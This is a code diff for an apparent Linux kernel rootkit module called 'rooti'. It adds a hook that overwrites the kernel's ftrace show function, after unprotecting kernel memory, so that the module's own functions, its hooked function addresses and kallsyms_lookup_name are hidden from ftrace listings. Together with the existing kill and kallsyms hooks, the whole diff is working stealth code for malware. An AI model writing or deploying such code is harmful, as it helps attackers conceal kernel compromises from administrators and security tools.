@@ -61,6 +61,7 @@ static void (*orig_do_exit)(long code);
 
 #ifndef ROOTI_DEBUG_SHOWME
 static int (*orig_kallsyms_seq_show)(struct seq_file *m, void *p);
+static int (*orig_ftrace_seq_show)(struct seq_file *m, void *v);
 #endif
 
 static asmlinkage long hook_kill(const struct pt_regs *regs)
@@ -261,6 +262,55 @@ static int hook_kallsyms_seq_show(struct seq_file *m, void *p)
 
     return orig_kallsyms_seq_show(m, p);
 }
+
+static int hook_ftrace_seq_show(struct seq_file *m, void *v)
+{
+    // Copied from kernel
+    struct ftrace_iterator {
+    	loff_t				        pos;
+    	loff_t				        func_pos;
+    	loff_t				        mod_pos;
+    	struct ftrace_page		    *pg;
+    	struct dyn_ftrace		    *func;
+    	struct ftrace_func_probe	*probe;
+    	struct ftrace_func_entry	*probe_entry;
+    	struct trace_parser {
+           	bool		cont;
+           	char		*buffer;
+           	unsigned	idx;
+           	unsigned	size;
+        }		                    parser;
+    	struct ftrace_hash		    *hash;
+    	struct ftrace_ops		    *ops;
+    	struct trace_array		    *tr;
+    	struct list_head		    *mod_list;
+    	int				            pidx;
+    	int				            idx;
+    	unsigned			        flags;
+    };
+
+    struct ftrace_iterator *iter = m->private;
+    struct dyn_ftrace *rec = iter->func;
+    struct rooti_func_hook *hook;
+
+    if (!rec)
+        return orig_ftrace_seq_show(m, v);
+
+    if (within_module(rec->ip, THIS_MODULE))
+        return 0;
+
+    list_for_each_entry(hook, &rooti_active_hooks, list) {
+        if (iter->flags & (FTRACE_ITER_ENABLED | FTRACE_ITER_TOUCHED) && rec->ip == hook->addr) {
+            return 0;
+        }
+    }
+
+    if (iter->flags & FTRACE_ITER_TOUCHED && rec->ip == (unsigned long)__kallsyms_lookup_name) {
+        return 0;
+    }
+
+    return orig_ftrace_seq_show(m, v);
+}
 #endif
 
 struct rooti_func_hook rooti_func_hooks[] = {
@@ -319,11 +369,14 @@ static int __init rooti_init(void)
         return err;
 
     ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, -ENOENT);
+    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, show_ftrace_seq_ops, -ENOENT);
 
     orig_kallsyms_seq_show = __kallsyms_op->show;
+    orig_ftrace_seq_show = __show_ftrace_seq_ops->show;
 
     rooti_unprotect_memory();
     __kallsyms_op->show = hook_kallsyms_seq_show;
+    __show_ftrace_seq_ops->show = hook_ftrace_seq_show;
     rooti_protect_memory();
 #endif
 
@@ -336,9 +389,11 @@ static void __exit rooti_exit(void)
 {
 #ifndef ROOTI_DEBUG_SHOWME
     ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, );
+    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, show_ftrace_seq_ops, );
 
     rooti_unprotect_memory();
     __kallsyms_op->show = orig_kallsyms_seq_show;
+    __show_ftrace_seq_ops->show = orig_ftrace_seq_show;
     rooti_protect_memory();
 #endif
 
